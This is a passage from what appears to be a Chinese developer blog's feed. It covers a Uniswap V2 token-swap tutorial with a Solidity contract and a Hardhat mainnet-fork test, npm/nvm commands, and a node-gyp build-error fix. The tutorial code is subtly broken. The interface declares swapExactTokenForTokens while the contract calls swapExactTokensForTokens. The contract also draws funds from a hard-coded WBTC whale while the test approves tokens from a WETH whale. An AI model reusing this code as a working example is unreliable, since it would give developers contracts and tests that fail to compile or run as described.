miner区块奖励</h2><blockquote><p>我们常说的挖矿奖励，当挖出了一个新区块时，以太奖励将会达到挖出人指定的地址上，无论这个地址是什么，它都会多出这笔奖励余额；</p><p>如今以太坊转型为PoS权益证明机制，miner区块奖励将会逐渐销声匿迹。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>合约安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>合约安全审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>part2. UniSwap V2 | Swap Token</title>
    <link href="/2022/10/23/Part2.%20UniSwap%20V2%20%20Swap%20Tokens/"/>
    <url>/2022/10/23/Part2.%20UniSwap%20V2%20%20Swap%20Tokens/</url>
    
    <content type="html"><![CDATA[<blockquote><p>访问  <a href="https://app.uniswap.org/">UniSwap</a></p><p>本章我们教大家如何解锁ETH主网上的巨鲸地址，并用该地址发起交易</p></blockquote><h2 id="1-编写合约接口"><a href="#1-编写合约接口" class="headerlink" title="1.编写合约接口"></a>1.编写合约接口</h2><p>在&#x2F;interfaces文件夹下创建<code>IERC20.sol和Uniswap.sol</code>文件</p><p><code>IERC20.sol</code>(官方标准接口，建议保存)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//SPDX-License-Identifier: UNLICENSED<br>pragma solidity &gt;=0.5.0;<br><br>interface IERC20 &#123;<br>    event Approval(address indexed owner, address indexed spender, uint value);<br>    event Transfer(address indexed from, address indexed to, uint value);<br><br>    function name() external view returns (string memory);<br>    function symbol() external view returns (string memory);<br>    function decimals() external view returns (uint8);<br>    function totalSupply() external view returns (uint);<br>    function balanceOf(address owner) external view returns (uint);<br>    function allowance(address owner, address spender) external view returns (uint);<br><br>    function approve(address spender, uint value) external returns (bool);<br>    function transfer(address to, uint value) external returns (bool);<br>    function transferFrom(address from, address to, uint value) external returns (bool);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Uniswap.sol</code>（自写接口文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//SPDX-License-Identifier: UNLICENSED<br>pragma solidity 0.8.0;<br><br>interface IUniswapV2Router &#123;<br>    function swapExactTokenForTokens(<br>        uint256 amountIn,<br>        uint256 amountOutMin,<br>        address[] calldata path,<br>        address to,<br>        uint256 deadline<br>    ) external returns (uint256[] memory amounts);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-接口函数swapExactTokenForTokens参数详解"><a href="#2-接口函数swapExactTokenForTokens参数详解" class="headerlink" title="2.接口函数swapExactTokenForTokens参数详解"></a>2.接口函数<code>swapExactTokenForTokens</code>参数详解</h2><blockquote><p>这是一个用已知数量的代币去交换未知数量代币的接口函数</p><p>举个例子：用100usdt的代币去交换btc，100是已知的，但能够交换到多少btc是未知的</p></blockquote><ol><li><code>amountIn</code> 用于交换的代币的数量，就是上例中的100；</li><li><code>amountOutMin</code> 即用户所期望的滑点；</li><li><code>path</code> 交易路径，用于确认交换代币的种类，上例中用usdt交换btc，那么交易路径就是[‘usdt合约地址’,’btc合约地址’]；</li><li><code>to</code>  自己的钱包地址</li><li><code>deadline</code> 常说的ddl，如果这次交易到ddl还没有打包成功，那么该次交易将会撤回</li></ol><h2 id="3-编写测试合约"><a href="#3-编写测试合约" class="headerlink" title="3.编写测试合约"></a>3.编写测试合约</h2><p><code>TestUniswap.sol</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8;<br><br>//导入接口<br>import &quot;./interfaces/IERC20.sol&quot;;<br>import &quot;./interfaces/Uniswap.sol&quot;;<br><br>//在本合约中我们模拟巨鲸账户在主网发起交易<br>//本实例中，使用WBTC交换DAI币<br>contract TestUniswap &#123;<br>    //定义UniSwap路由<br>    address private constant UNISWAP_V2_ROUTER =<br>        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;<br>    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;<br>    //定义巨鲸账户地址<br>    address private constant WBTC_WHALE =<br>        0x2FAF487A4414Fe77e2327F0bf4AE2a264a776AD2;<br>    //交换函数<br>    function swap(<br>        address _tokenIn,<br>        address _tokenOut,<br>        uint256 _amountIn,<br>        uint256 _amountOutMin,<br>        address _to<br>    ) external &#123;<br>        //模拟巨鲸账户地址触发该币种交易<br>        IERC20(_tokenIn).transferFrom(WBTC_WHALE, address(this), _amountIn);<br>        //向uniswap路由授权该币种<br>        IERC20(_tokenIn).approve(UNISWAP_V2_ROUTER, _amountIn);<br><br>        address[] memory path;<br>        //判断<br>        //在uniswap中，WETH作为所有币种交换的中间币<br>        //因此在这里需要判断是否是WETH作为交换币种<br>        if (_tokenIn == WETH || _tokenOut == WETH) &#123;<br>            path = new address[](2);<br>            path[0] = _tokenIn;<br>            path[1] = _tokenOut;<br>        &#125; else &#123;<br>            path = new address[](3);<br>            path[0] = _tokenIn;<br>            path[1] = WETH;<br>            path[2] = _tokenOut;<br>        &#125;<br><br>  //调用接口函数      <br>IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(<br>            _amountIn,<br>            _amountOutMin,<br>            path,<br>            _to,<br>            block.timestamp<br>        );<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译合约</p><h2 id="4-测试项目"><a href="#4-测试项目" class="headerlink" title="4.测试项目"></a>4.测试项目</h2><blockquote><p>在本教程中，我们选在hardhat的waffle写法来实现测试</p><p>使用ganache-cli来模拟网络环境</p></blockquote><p><strong>须知：</strong></p><ul><li>hardhat与ether.js&amp;&amp;waffle是原生搭配</li><li>truffle 与web3.js&amp;&amp;mocha是原生搭配</li><li>waffle和mocha都是独特的接口写法类型</li><li>他们分别基于ether.js和web3.js实现</li></ul><h3 id="test-testUniswap-js"><a href="#test-testUniswap-js" class="headerlink" title="test/testUniswap.js"></a><code>test/testUniswap.js</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123;<br>    ethers<br>  &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hardhat&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> hre = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hardhat&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> &#123;<br>    <span class="hljs-variable constant_">WETH</span>,<br>    <span class="hljs-variable constant_">DAI</span>,<br>    <span class="hljs-variable constant_">WETH_WHALE</span><br>  &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./config&quot;</span>);<br>  <br><br>  <span class="hljs-keyword">const</span> &#123; pow &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./util&#x27;</span>);<br>  <br>  <span class="hljs-comment">//模块测试</span><br>  <span class="hljs-title function_">describe</span>(<span class="hljs-string">&quot;TestUniswap&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br><br>    <span class="hljs-comment">//定义用于交换的代币数量</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AMOUNT_IN</span> = <span class="hljs-number">100000</span>;<br>    <span class="hljs-comment">//最小</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AMOUNT_OUT_MIN</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//以太坊</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TOKEN_IN</span> = <span class="hljs-variable constant_">WETH</span>;<br>    <span class="hljs-comment">//dai币</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TOKEN_OUT</span> = <span class="hljs-variable constant_">DAI</span>;<br>  <br>  <br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">TestUniswap</span>;<br>    <span class="hljs-keyword">let</span> testUniswap;<br>    <span class="hljs-keyword">let</span> tokenIn;<br>    <span class="hljs-keyword">let</span> tokenOut;<br>    <span class="hljs-keyword">let</span> whale;<br>  <br>  <br>    <span class="hljs-title function_">beforeEach</span>(<span class="hljs-keyword">async</span> () =&gt; &#123;<br>  <br>      <span class="hljs-comment">//解锁巨鲸账户</span><br>      <span class="hljs-keyword">await</span> hre.<span class="hljs-property">network</span>.<span class="hljs-property">provider</span>.<span class="hljs-title function_">request</span>(&#123;<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;hardhat_impersonateAccount&quot;</span>,<br>        <span class="hljs-attr">params</span>: [<span class="hljs-variable constant_">WETH_WHALE</span>],<br>      &#125;)<br>  <br>      <span class="hljs-comment">//实例化巨鲸账户</span><br>      whale = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigner</span>(<span class="hljs-variable constant_">WETH_WHALE</span>);<br>  <br>      <span class="hljs-comment">//whale.address</span><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;the whale address is: &#x27;</span>, whale.<span class="hljs-property">address</span>)<br>      <br>      <span class="hljs-comment">//实例化tokenin，实例化tokenout</span><br>      tokenIn = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&quot;IERC20&quot;</span>, <span class="hljs-variable constant_">TOKEN_IN</span>);<br>      tokenOut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&quot;IERC20&quot;</span>, <span class="hljs-variable constant_">TOKEN_OUT</span>);<br><br>      <span class="hljs-comment">//实例化刚写的测试合约</span><br>      <span class="hljs-title class_">TestUniswap</span> = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<span class="hljs-string">&#x27;TestUniswap&#x27;</span>);<br>      testUniswap = <span class="hljs-keyword">await</span> <span class="hljs-title class_">TestUniswap</span>.<span class="hljs-title function_">deploy</span>();<br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;tokenIn address is:&#x27;</span>, tokenIn.<span class="hljs-property">address</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;tokenOut address is:&#x27;</span>, tokenOut.<span class="hljs-property">address</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;testUniswap address is:&#x27;</span>, testUniswap.<span class="hljs-property">address</span>);<br>   <br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;the whale WETH balance is:&quot;</span>, <span class="hljs-keyword">await</span> tokenIn.<span class="hljs-title function_">balanceOf</span>(whale.<span class="hljs-property">address</span>))<br>  <br>      <span class="hljs-keyword">await</span> tokenIn.<span class="hljs-title function_">connect</span>(whale).<span class="hljs-title function_">approve</span>(testUniswap.<span class="hljs-property">address</span>,<span class="hljs-variable constant_">AMOUNT_IN</span>);<br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;approve token success!&#x27;</span>)<br>  <br>    &#125;);<br>  <br>  <br>  <br>    <span class="hljs-title function_">it</span>(<span class="hljs-string">&quot;should swap&quot;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;<br>  <br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;the whale dai balance is : &#x27;</span>, <span class="hljs-keyword">await</span> tokenOut.<span class="hljs-title function_">balanceOf</span>(whale.<span class="hljs-property">address</span>));<br>  <br>  <br>      <span class="hljs-keyword">await</span> testUniswap.<span class="hljs-title function_">connect</span>(whale).<span class="hljs-title function_">swap</span>(<br>        tokenIn.<span class="hljs-property">address</span>,<br>        tokenOut.<span class="hljs-property">address</span>,<br>        <span class="hljs-variable constant_">AMOUNT_IN</span>,<br>        <span class="hljs-variable constant_">AMOUNT_OUT_MIN</span>,<br>        whale.<span class="hljs-property">address</span>, <br>        &#123;<br>          <span class="hljs-attr">gasPrice</span>: <span class="hljs-number">10000000000</span>,<br>          <span class="hljs-attr">gasLimit</span>: <span class="hljs-number">2000000</span><br>        &#125;<br>  <br>      )<br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`swap tokenin is <span class="hljs-subst">$&#123;AMOUNT_IN&#125;</span>`</span>);<br>  <br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;after swap the whale dai balance is : &#x27;</span>, <span class="hljs-keyword">await</span> tokenOut.<span class="hljs-title function_">balanceOf</span>(whale.<span class="hljs-property">address</span>));<br>  <br>      <br>    &#125;);<br>  &#125;);<br></code></pre></td></tr></table></figure><h3 id="别忘了配置hardhat-config-js"><a href="#别忘了配置hardhat-config-js" class="headerlink" title="别忘了配置hardhat.config.js"></a>别忘了配置<code>hardhat.config.js</code></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">require(&quot;@nomiclabs/hardhat-waffle&quot;);<br><br><br><br>const MAINNET_URL = &quot;https://eth-mainnet.g.alchemy.com/v2/自己的apikey&quot;;<br><br>module.exports = &#123;<br>  solidity: &quot;0.8.0&quot;,<br>  networks: &#123;<br>    hardhat: &#123;<br>      forking: &#123;<br>        url: MAINNET_URL<br>      &#125;<br>      <br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><ol><li>开启本地节点监听</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npx hardhat node <br></code></pre></td></tr></table></figure><ol start="2"><li>开始测试（需要指定在当前网络之下测试）</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npx hardhat test --network localhost<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>DeFi</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Uniswap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建专属于你的DEX(part.1)</title>
    <link href="/2022/10/22/%E6%90%AD%E5%BB%BA%E4%B8%93%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84DEX-part1/"/>
    <url>/2022/10/22/%E6%90%AD%E5%BB%BA%E4%B8%93%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84DEX-part1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>npm&amp;nvm基本操作</title>
    <link href="/2022/10/12/npm&amp;nvm%E5%BF%85%E5%A4%87%E6%93%8D%E4%BD%9C/"/>
    <url>/2022/10/12/npm&amp;nvm%E5%BF%85%E5%A4%87%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><h3 id="1-镜像"><a href="#1-镜像" class="headerlink" title="1. 镜像"></a>1. 镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 查看当前的镜像源</span><br>npm config get registry<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 修改镜像路径（淘宝）</span><br>npm config set tao&#x27;bao https://registry.npm.taobao.org<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. 安装镜像管理器nrm</span><br>npm i nrm -g<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">4. 查看当前环境中所有的镜像</span><br>nrm ls<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">5. nrm快速切换淘宝镜像</span><br>nrm use taobao<br><br></code></pre></td></tr></table></figure><h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 全局安装</span><br>npm i module -g<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 安装到开发环境</span><br>npm i --save-dev module<br><span class="hljs-meta prompt_"># </span><span class="language-bash">等同于</span><br>npm i -D module<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. 安装到生产环境</span><br>npm i --save module<br><span class="hljs-meta prompt_"># </span><span class="language-bash">等同于</span><br>npm i -S module<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">4. 同时安装多个模块，模块之间要有空格</span><br>npm i module1 module2 module3...<br></code></pre></td></tr></table></figure><h2 id="nvm-以管理员身份运行cmd"><a href="#nvm-以管理员身份运行cmd" class="headerlink" title="nvm(以管理员身份运行cmd)"></a>nvm(以管理员身份运行cmd)</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>到 github 上面下载。下载地址：<a href="https://links.jianshu.com/go?to=https://github.com/coreybutler/nvm-windows/releases">https://github.com/coreybutler/nvm-windows/releases</a></p><h3 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看nvm安装node的目录</span><br>nvm root<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前已经安装的node版本</span><br>nvm list<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前可用的node版本</span><br>nvm list avaliable<br><span class="hljs-meta prompt_"># </span><span class="language-bash">取消选中的node版本</span><br>nvm off<br><span class="hljs-meta prompt_"># </span><span class="language-bash">选用node版本</span><br>nvm use XX.XX.XX<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装node新版本</span><br>nvm install XX.XX.XX<br><span class="hljs-meta prompt_"># </span><span class="language-bash">卸载node版本</span><br>nvm uninstall XX.XX.XX<br><span class="hljs-meta prompt_">#</span><span class="language-bash">测试</span><br>nvm -v<br>npm -v<br><span class="hljs-meta prompt_">#</span><span class="language-bash">qi</span><br>npm cache clean --force<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>基操勿6</category>
      
      <category>包管理器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>npm</tag>
      
      <tag>nvm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gyp ERR(not found visual studio 20xx v)解决</title>
    <link href="/2022/10/04/gyp%20ERR-not%20found%20visual%20studio%2020xx%20%E8%A7%A3%E5%86%B3/"/>
    <url>/2022/10/04/gyp%20ERR-not%20found%20visual%20studio%2020xx%20%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>最近项目安装蚂蚁链依赖包的时候，运行 npm i，出现如下错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs shell">gyp ERR! find VS <br>gyp ERR! find VS msvs_version was set from command line or npm config<br>gyp ERR! find VS - looking for Visual Studio version 2015<br>gyp ERR! find VS VCINSTALLDIR not set, not running in VS Command Prompt<br>gyp ERR! find VS unknown version &quot;undefined&quot; found at &quot;C:\Program Files\Microsoft Visual Studio\2022\Community&quot;<br>gyp ERR! find VS could not find a version of Visual Studio 2017 or newer to use<br>gyp ERR! find VS looking for Visual Studio 2015<br>gyp ERR! find VS - not found<br>gyp ERR! find VS not looking for VS2013 as it is only supported up to Node.js 8<br>gyp ERR! find VS <br>gyp ERR! find VS valid versions for msvs_version:<br>gyp ERR! find VS<br>gyp ERR! find VS **************************************************************<br>gyp ERR! find VS You need to install the latest version of Visual Studio<br>gyp ERR! find VS including the &quot;Desktop development with C++&quot; workload.<br>gyp ERR! find VS For more information consult the documentation at:<br>gyp ERR! find VS https://github.com/nodejs/node-gyp#on-windows<br>gyp ERR! find VS **************************************************************<br>gyp ERR! find VS<br>gyp ERR! configure error<br>gyp ERR! stack Error: Could not find any Visual Studio installation to use<br>gyp ERR! stack     at VisualStudioFinder.fail (E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\find-visualstudio.js:121:47)<br>gyp ERR! stack     at E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\find-visualstudio.js:74:16<br>gyp ERR! stack     at VisualStudioFinder.findVisualStudio2013 (E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\find-visualstudio.js:351:14)       <br>gyp ERR! stack     at E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\find-visualstudio.js:70:14<br>gyp ERR! stack     at E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\find-visualstudio.js:372:16<br>gyp ERR! stack     at E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\util.js:54:7<br>gyp ERR! stack     at E:\Enviroment\nvm\v14.17.6\node_modules\npm\node_modules\node-gyp\lib\util.js:33:16<br>gyp ERR! stack     at ChildProcess.exithandler (child_process.js:397:5)<br>gyp ERR! stack     at ChildProcess.emit (events.js:400:28)<br>gyp ERR! stack     at maybeClose (internal/child_process.js:1055:16)<br>gyp ERR! System Windows_NT 10.0.22000<br>gyp ERR! command &quot;C:\\Program Files\\nodejs\\node.exe&quot; &quot;E:\\Enviroment\\nvm\\v14.17.6\\node_modules\\npm\\node_modules\\node-gyp\\bin\\node-gyp.js&quot; &quot;rebuild&quot;<br>gyp ERR! cwd E:\AntPrograms\antchain-fronted\node_modules\secp256k1<br>gyp ERR! node -v v14.17.6<br>gyp ERR! node-gyp -v v5.1.0<br>gyp ERR! not ok<br>npm ERR! code ELIFECYCLE<br>npm ERR! errno 1<br>npm ERR! secp256k1@3.8.0 rebuild: `node-gyp rebuild`<br>npm ERR! Exit status 1<br>npm ERR!<br>npm ERR! Failed at the secp256k1@3.8.0 rebuild script.<br>npm ERR! This is probably not a problem with npm. There is likely additional logging output above.<br>npm WARN Local package.json exists, but node_modules missing, did you mean to install?<br><br>npm ERR! A complete log of this run can be found in:<br></code></pre></td></tr></table></figure><p><strong>解决办法是:安装 –unsafe-perm</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install --unsafe-perm  // Windows不需要加sudo<br>或<br>yarn --unsafe-perm  // Windows不需要加sudo<br><br>// 如果还是报错，这时候你需要删除node_module和 .lock文件，重新安装<br></code></pre></td></tr></table></figure><p><strong>看一个猿友这样解释说：</strong></p><blockquote><p>npm 出于安全考虑不支持以 root 用户运行，即使你用 root 用户身份运行了，npm 会自动转成一个叫 nobody 的用户来运行，而这个用户几乎没有任何权限。这样的话如果你脚本里有一些需要权限的操作，比如写文件（尤其是写 